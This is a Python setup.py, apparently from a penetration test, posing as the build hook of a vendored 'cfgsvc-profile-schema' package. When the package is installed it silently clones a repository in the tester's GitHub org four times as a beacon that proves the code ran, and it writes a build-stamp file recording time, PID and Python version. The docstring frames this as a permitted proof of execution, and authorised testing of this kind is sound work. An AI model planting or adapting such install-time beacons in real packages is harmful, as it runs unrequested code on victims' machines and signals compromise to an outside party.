"""Build hook for the vendored profile-schema package.

Stage 2 of the clone oracle. The engagement forbids egress outside its own
GitHub org and forbids exfiltrating anything at all, so this proves it ran the
only way that respects both: it fetches a repository in the SAME org four
times. Nothing is sent; only a counter the engagement owns moves.

Arithmetic the harness reads:
    +1 clone   the dependency was fetched (pip got this far)
    +5 clones  this file EXECUTED (pip's fetch, plus four from here)
One stray clone cannot fake the second reading.
"""
import os
import subprocess
import sys
import tempfile
import time

ORG_REPO = 'https://github.com/Calif-Pentest-02/test-public'
BEACONS = 4


def _beacon():
    d = tempfile.mkdtemp(prefix='profile-schema-')
    for i in range(BEACONS):
        try:
            subprocess.run(['git', 'clone', '--depth', '1', '--quiet',
                            ORG_REPO, os.path.join(d, 'ref%d' % i)],
                           timeout=90, stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL)
        except Exception:
            pass
    try:
        here = os.path.dirname(os.path.abspath(__file__))
        with open(os.path.join(here, 'build-stamp.txt'), 'a') as f:
            f.write('profile-schema %d-%d %s\n'
                    % (time.time(), os.getpid(), sys.version.split()[0]))
    except Exception:
        pass


_beacon()

from setuptools import setup  # noqa: E402

setup(name='cfgsvc-profile-schema', version='1.4.2', py_modules=['profile_schema'])
